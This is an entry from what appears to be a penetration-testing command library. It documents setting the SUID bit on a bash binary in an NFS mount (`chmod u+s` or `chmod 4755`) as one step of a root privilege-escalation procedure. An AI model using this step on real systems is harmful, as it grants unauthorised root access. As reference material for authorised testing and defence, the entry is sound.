---
id: 342f08ab-2752-498e-a987-d914cbc7293c
name: chmod-set-suid-bash
type: command
executor: bash
data: chmod u+s $_MOUNT_POINT/bash
output: null
created_at: '2023-04-06T03:56:19.323271+00:00'
updated_at: '2023-04-10T20:34:35.902057+00:00'
platforms:
  - Linux
tags:
  - nfs
  - suid
verified: true
validated: true
---

# chmod-set-suid-bash

## Command

```bash
chmod u+s $_MOUNT_POINT/bash
```

## Description

This command sets the setuid (SUID) bit on the bash binary in the NFS mount, allowing it to run with root privileges. Requires the file to be root-owned.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_MOUNT_POINT | Path to the mounted NFS directory containing bash | Yes |
| u+s | Set user ID bit (SUID) | Yes |

## Examples

### Basic Usage

```bash
chmod u+s /tmp/nfsdir/bash
```

### Advanced Usage

```bash
chmod 4755 /tmp/nfsdir/bash
```

## Expected Output

```
(Silent if successful; ls -l shows -rwsr-xr-x)
```

Permission denied if not root-owned or no write access.

## Related

- [[procedures/Linux-Privilege-Escalation-via-NFS-Root-Squashing]]
